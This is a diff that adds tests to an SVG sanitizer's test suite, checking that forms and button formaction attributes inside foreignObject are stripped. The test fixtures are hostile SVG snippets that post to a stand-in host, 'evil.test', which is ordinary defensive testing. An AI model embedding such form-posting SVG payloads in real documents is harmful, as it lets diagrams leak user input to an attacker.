@@ -98,6 +98,41 @@ describe("sanitizeSvg — external resource references must not phone home", () 
   });
 });
 
+// WI-RA8.1 — a form in a diagram posts to whatever the document named.
+describe("sanitizeSvg — a diagram cannot carry a form", () => {
+  const form =
+    '<svg><foreignObject><form action="https://evil.test/collect" method="post">' +
+    '<input name="q" value="1"><button>Go</button></form></foreignObject></svg>';
+
+  it("removes the form element and the address it would post to", () => {
+    const out = sanitizeSvg(form);
+    expect(out).not.toMatch(/<form/i);
+    expect(out).not.toContain("evil.test");
+  });
+
+  it("keeps what was inside it — the content is not the danger", () => {
+    const out = sanitizeSvg(form);
+    expect(out).toContain("<button>Go</button>");
+    expect(out).toContain('<input name="q"');
+  });
+
+  it.each(["FORM", "Form", "fOrM"])("removes it however the tag is cased (%s)", (tag) => {
+    const out = sanitizeSvg(
+      `<svg><foreignObject><${tag} action="https://evil.test/c">x</${tag}></foreignObject></svg>`,
+    );
+    expect(out).not.toMatch(/<form/i);
+    expect(out).toContain("x");
+  });
+
+  it("removes a button's own posting address and its link to a form elsewhere", () => {
+    const out = sanitizeSvg(
+      '<svg><foreignObject><button form="app-form" formaction="https://evil.test/b">Go</button></foreignObject></svg>',
+    );
+    expect(out).not.toContain("formaction");
+    expect(out).not.toContain("app-form");
+  });
+});
+
 describe("sanitizeSvg — stylesheet content", () => {
   it("strips a remote @import from a <style> element", () => {
     // The attribute hook never sees this: the payload is element TEXT.
